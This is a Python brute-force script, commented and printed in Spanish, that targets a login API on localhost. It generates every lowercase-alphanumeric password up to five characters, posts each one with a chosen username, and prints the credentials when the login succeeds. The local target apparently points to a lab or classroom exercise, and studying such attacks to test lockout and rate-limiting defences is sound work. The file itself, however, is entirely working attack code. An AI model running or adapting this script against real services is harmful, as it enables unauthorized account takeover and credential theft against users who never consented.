import requests
import itertools
import string
import time
import sys

URL_API = "http://127.0.0.1:8000/login"

CARACTERES = string.ascii_lowercase + string.digits
LONGITUD_MAXIMA_CONTRASENA = 5 

def generar_contrasenas():
    lista_contrasenas = []
    for longitud in range(1, LONGITUD_MAXIMA_CONTRASENA + 1):
        for combinacion in itertools.product(CARACTERES, repeat=longitud):
            lista_contrasenas.append("".join(combinacion))
    return lista_contrasenas

def ejecutar_ataque(nombre_usuario: str):
    print(f"[*] Iniciando ataque de fuerza bruta contra el usuario: '{nombre_usuario}'")
    tiempo_inicio = time.time()
    
    contrasenas_a_probar = generar_contrasenas()
    
    contador_intentos = 0
    
    for contrasena_supuesta in contrasenas_a_probar:
        contador_intentos += 1
        
        if contador_intentos % 1000 == 0:
            print(f"[+] Probando... (Intento #{contador_intentos}, Contraseña actual: '{contrasena_supuesta}')")
        
        cuerpo = {
            "usuario": nombre_usuario,
            "contrasena": contrasena_supuesta
        }
        respuesta = requests.post(URL_API, json=cuerpo)
        
        if respuesta.status_code == 200:
            respuesta_json = respuesta.json()
            if respuesta_json.get("message") == "login successful":
                tiempo_fin = time.time()
                print("Contraseña encontrada.")
                print(f"Usuario: {nombre_usuario}")
                print(f"Contraseña: {contrasena_supuesta}")
                print(f"Total de intentos: {contador_intentos}")
                print(f"Tiempo total: {tiempo_fin - tiempo_inicio:.2f} segundos.")
                return True 

    print("\nFallo: No se pudo encontrar la contraseña dentro de la longitud máxima establecida.")
    return False

if __name__ == "__main__":
    nombre_usuario_objetivo = ""
    
    if len(sys.argv) < 2:
        entrada_usuario = input("Por favor, introduce el nombre de usuario a atacar (ej. admin): ")
        if entrada_usuario:
            nombre_usuario_objetivo = entrada_usuario
    else:
        nombre_usuario_objetivo = sys.argv[1]
        
    if not nombre_usuario_objetivo:
        print("Uso: python attack.py <nombre_de_usuario> o proporciona el usuario al ser solicitado.")
        sys.exit(1)
        
    ejecutar_ataque(nombre_usuario_objetivo)
